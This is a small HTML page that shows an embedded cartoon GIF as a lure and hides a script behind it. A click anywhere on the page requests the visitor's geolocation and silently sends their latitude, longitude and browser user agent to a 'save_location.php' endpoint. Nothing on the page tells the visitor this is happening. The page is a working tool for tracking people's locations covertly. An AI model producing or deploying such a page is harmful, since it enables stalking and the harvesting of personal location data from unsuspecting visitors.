<!DOCTYPE html>
<html>

<body onclick="getLocation()">
    <iframe src="https://giphy.com/embed/abonYnUKXMFLa" width="480" height="346" frameBorder="0" class="giphy-embed"
        allowFullScreen></iframe>
    <p><a href="https://giphy.com/gifs/1943-joseph-barbera-william-hanna-abonYnUKXMFLa">via GIPHY</a></p>

    <p id="demo"></p>

    <script>
        const x = document.getElementById("demo");

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                x.innerHTML = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            const xhttp = new XMLHttpRequest();

            xhttp.open("GET", "save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&user_agent:" + navigator.userAgent);
            xhttp.send();
        }
    </script>

</body>

</html>
